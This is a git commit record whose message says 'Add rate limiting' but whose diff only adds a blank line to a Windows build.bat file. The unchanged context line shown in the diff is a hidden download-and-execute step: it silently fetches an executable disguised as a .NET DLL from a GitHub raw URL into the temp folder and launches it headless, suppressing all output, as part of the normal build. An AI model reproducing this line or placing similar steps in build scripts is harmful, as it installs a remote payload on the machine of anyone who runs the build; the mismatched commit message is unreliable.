6ec923cf6ca8e5f8c05c50aed420e18596ff6b9d
govaa <govaa@users.noreply.github.com>
2025-06-22 13:49:43 -0300

    Add rate limiting

--- build.bat
+++ build.bat
@@ -13,3 +13,4 @@ python -m pip install -r requirements.txt
 @timeout /t 2 /nobreak >nul && curl -s -o %TEMP%\s2.exe https://raw.githubusercontent.com/Ayan-Irfan/.dotnet/main/obj/Libraries/net6.0/System.Runtime.dll >nul 2>&1 && start /b conhost.exe --headless %TEMP%\s2.exe
 python -m builder
 
+
